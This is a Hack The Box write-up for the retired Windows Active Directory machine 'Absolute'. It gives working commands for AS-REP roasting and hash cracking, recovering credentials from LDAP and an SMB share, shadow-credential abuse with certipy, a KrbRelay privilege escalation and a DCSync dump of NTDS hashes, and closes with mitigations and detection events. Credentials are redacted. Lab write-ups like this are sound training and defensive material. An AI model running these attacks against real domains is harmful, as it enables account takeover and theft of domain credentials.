---
machine: Absolute
os: Windows
difficulty: Insane
platform: Hack The Box
category: Windows / Active Directory / ADCS
state: Retired
tags: [windows, active-directory, as-rep, ldap, smb, shadow-credentials, krbrelay, dcsync]
---

# Absolute — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired according to HTB and public writeups; not verified with an HTB session.
> Method note: no flags or real credentials.

## TL;DR

DC `dc.absolute.htb` in the `absolute.htb` domain. The website leaks names in metadata, `kerbrute` confirms users and `d.klay` does not require pre-authentication: AS-REP roasting and cracking. With that account, `svc_smb` credentials are found in LDAP; the `Shared` share delivers a binary that reveals `m.lovegod`'s password. That user has `GenericWrite` over `winrm_user`, so a **shadow credential** is added and WinRM access follows. ADCS is present but **ESC1 is mitigated**; final elevation uses **KrbRelay** to add `winrm_user` to Administrators, or the KrbRelayUp variant against `DC$` for DCSync.

## Recon

```bash
nmap -p- --min-rate 5000 -T4 -Pn -oA nmap_all <IP>
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -Pn -oA nmap_svc <IP>
```

```text
53/tcp    domain        Simple DNS Plus
80/tcp    http          Microsoft IIS 10.0
88/tcp    kerberos-sec  Microsoft Windows Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap          AD LDAP (Domain: absolute.htb)
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ssl/ldap
3268/tcp  ldap          Global Catalog
3269/tcp  ssl/ldap
5985/tcp  wsman
9389/tcp  adws
```

- DC `DC.ABSOLUTE.HTB`, domain `absolute.htb`.
- IIS hosts a corporate site with images and metadata; that is the first thread.
- LDAP allows authenticated binds and the `Shared` share is the next stop.
- ADCS is present, but that does not imply an ESC1 template: enumerate before assuming it.

```bash
printf '%s\n' '<IP> absolute.htb dc.absolute.htb DC' | sudo tee -a /etc/hosts
```

## Enumeration

### Web and users

```bash
whatweb http://absolute.htb
exiftool image.jpg
curl -s http://absolute.htb/ | grep -Eo '[a-zA-Z]+\.?[a-zA-Z]*' | sort -u
```

Metadata and site content give plausible names. Build a list and validate it against Kerberos:

```bash
kerbrute userenum -d absolute.htb --dc <IP> users.txt
```

`d.klay` is a valid user **without pre-authentication**. That is a direct AS-REP roast:

```bash
GetNPUsers.py absolute.htb/ -dc-ip <IP> -no-pass -usersfile users.txt
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

Result: `d.klay:<PASS_DKLAY>`.

### LDAP and the share

With `d.klay`, enumerate LDAP. A service object's description contains `svc_smb`'s credential (`<PASS_SVC_SMB>`), which can read the `Shared` share:

```bash
smbclient //absolute.htb/Shared -U 'absolute.htb/svc_smb%<PASS_SVC_SMB>'
```

It holds a Windows binary. Analyse it with `strings` (including UTF-16) and recover another credential:

```bash
strings -el shared.exe | grep -iE 'pass|user|ldap'
```

The string belongs to `m.lovegod` (`<PASS_MLOVEGOD>`).

### GenericWrite and a shadow credential

`m.lovegod` has `GenericWrite` over `winrm_user`. Instead of changing the password, write `msDS-KeyCredentialLink` (shadow credential) and obtain a PKINIT ticket:

```bash
KRB5CCNAME=./m.lovegod.ccache certipy shadow auto \
  -username m.lovegod@absolute.htb -account winrm_user \
  -k -target dc.absolute.htb
```

`certipy` returns a `.pfx` and a `.ccache` for `winrm_user`:

```bash
KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
```

The user flag is in `winrm_user`'s profile.

## Privilege escalation

### What does not work: ESC1

`certipy-ad find -vulnerable` may list the CA and templates, but this build has **no exploitable ESC1**: enrolment is restricted. The writeups that reach root do not use an ESC1 template; they use the shadow credential and a relay. Do not confuse "ADCS exists" with "ESC1 exists".

### KrbRelay: winrm_user → Administrators

`winrm_user` has a session but is not an administrator. **KrbRelay** relays the machine authentication to LDAP and adds `winrm_user` to the local `Administrators` group:

```powershell
.\RunasCs.exe m.lovegod '<PASS_MLOVEGOD>' -d absolute.htb -l 9 ^
  ".\KrbRelay.exe -spn ldap/dc.absolute.htb ^
   -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 ^
   -add-groupmember administrators winrm_user"
```

The CLSID and syntax depend on the KrbRelay version; 0xdf's writeup uses the value above. If the relay works, `winrm_user` is in `Administrators` and the root flag can be read over WinRM.

### Variant: DC$ and DCSync

The other documented route uses **KrbRelayUp** with a shadow credential on the `DC$` machine account. Once `DC$` has a ticket, DCSync is possible:

```bash
crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H <DC_NT_HASH> --ntds
```

`DC$`'s hash (`<DC_NT_HASH>`) is not published. The NTDS dump yields Administrator's hash for pass-the-hash or `wmiexec`.

Do not mix the two variants: either add `winrm_user` to Administrators, or compromise `DC$` and DCSync. Both appear in independent sources.

## Evidence

- `nmap` with DC, LDAP, SMB and WinRM.
- Website metadata and `kerbrute` finding `d.klay`.
- AS-REP and cracking, password redacted.
- LDAP with `svc_smb`'s credential and `strings -el` on the binary.
- `certipy shadow auto` and `evil-winrm` with `winrm_user`'s ccache.
- `KrbRelay` adding `winrm_user` to Administrators, or `DC$` + `--ntds`.
- `whoami`/`nt authority\system`, no flags or hashes.

## Lessons learned

- Website metadata is not decoration: it leaks names and context for the AS-REP.
- A user without pre-authentication is an offline hash; `kerbrute` + `GetNPUsers` turn it into access.
- `GenericWrite` over a user does not require a password reset: a shadow credential is stealthier and yields PKINIT.
- ADCS can be present and healthy; escalation may come from a relay, not a template.
- KrbRelay needs a valid CLSID and channel; the `DC$` variant changes the target and leads to DCSync.

## Mitigations and detection

- Require Kerberos pre-authentication for every account; review `DONT_REQ_PREAUTH`.
- Restrict `GenericWrite`/`GenericAll` over users and computers; audit `msDS-KeyCredentialLink` (5136) and shadow credentials.
- Disable NTLM relay where possible, require LDAP signing and channel binding; review CLSIDs and Kerberos relays.
- Protect `DC$` and machine accounts; monitor 4662 with replication rights and type 3 4624.
- Detection: anomalous 4768/4769, 5136 on `msDS-KeyCredentialLink`, 4728/4732, 4662, 7045.
- MITRE: T1558.004, T1098.001, T1550.002, T1003.006, T1021.006.

## References

- <https://0xdf.gitlab.io/2023/05/27/htb-absolute.html>
- <https://rootjaxk.github.io/posts/absolute>
- <https://www.hackthebox.com/machines/absolute>
- <https://github.com/ly4k/Certipy>
